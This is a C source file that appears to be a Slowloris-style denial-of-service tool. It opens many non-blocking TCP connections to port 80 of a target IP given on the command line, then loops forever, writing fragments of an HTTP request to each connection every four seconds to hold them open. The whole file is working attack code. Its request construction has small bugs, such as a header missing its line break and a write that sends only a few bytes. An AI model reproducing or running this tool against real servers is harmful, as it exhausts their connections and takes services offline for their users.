#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <inttypes.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int * initConnection(char* target)
{
	struct sockaddr_in svr_address;
	int * tcp_socket = malloc(sizeof(int));
	*tcp_socket = socket(AF_INET, SOCK_STREAM, 0); 
	fcntl(*tcp_socket, F_SETFL, O_NONBLOCK);
	fd_set fdset;
	struct timeval tv;

	svr_address.sin_family = AF_INET;
	svr_address.sin_port = htons(80);
	svr_address.sin_addr.s_addr = inet_addr(target);
	memset(&(svr_address.sin_zero), '\0', 8);

	connect(*tcp_socket, (struct sockaddr *)&svr_address, sizeof(struct sockaddr));

	FD_ZERO(&fdset);
	FD_SET(*tcp_socket, &fdset);
	tv.tv_sec = 10;
	tv.tv_usec = 0;

	if (select(*tcp_socket + 1, NULL, &fdset, NULL, &tv) == 1)
	{
		int so_error;
		socklen_t len = sizeof(so_error);

		getsockopt(*tcp_socket, SOL_SOCKET, SO_ERROR, &so_error, &len);

		if (!so_error)
		{
			return tcp_socket;
		}
	}
	// return failed connection if this point is reached
	free(tcp_socket);
	return NULL;
}

char * formHttpRequest(char* url_path, char* host_address, char* request_body, uint32_t cont_len_hdr)
{
	char * http_request = malloc(sizeof(char) * 512);
	snprintf(http_request, 512, 
		"GET %s HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Keep-Alive: timeout=15, max=100"
		"Content-type: application/x-www-form-urlencoded\r\n"
		"Content-length: %d\r\n\r\n"
		"%s\r\n", url_path, host_address, cont_len_hdr, request_body);
	return http_request;
}

int main(int argc, char* argv[])
{
	if(argc != 3)
	{
		printf("%s\n", "Incorrect number of arguments. Correct format: ");
		printf("%s\n", "[ip address] [connection count]");
		return 0;
	}
	
	char* target_address = argv[1];
	int num_conns = atoi(argv[2]);

	int* open_conns[num_conns];
	int actv_cnt = 0;
	int i;
	for(i = 0; i < num_conns; i++)
	{
		int* resp = initConnection(target_address);
		if(resp == NULL)
		{
			printf("%s\n", "error connecting");
		}
		else
		{
			printf("%s\n", "connection established");
			open_conns[actv_cnt] = resp;
			++actv_cnt;
		}
	}

	int* active_conns[actv_cnt];
	memcpy(active_conns, open_conns, sizeof(active_conns) );
	
	// send keep alive headers
	for(;;)
	{
		for(i = 0; i < actv_cnt; i++)
		{
			char* url_path = "/projects";
			char* request_body = "pranav_pradeep";
			unsigned int cont_len_hdr = strlen(request_body);

			char* http_request = formHttpRequest(url_path, target_address, request_body, cont_len_hdr);
			
			int resp;

			resp = write(*active_conns[i], http_request, strlen(request_body) + 1);
			printf("%s\n", http_request);
			if(resp < 0)
			{
				printf("%s\n", "failed to send HTTP request");
			}
			else
			{
				printf("%s\n", "sent stay alive packet successfully");
			}
		}
		sleep(4);
	}

	return 0;
}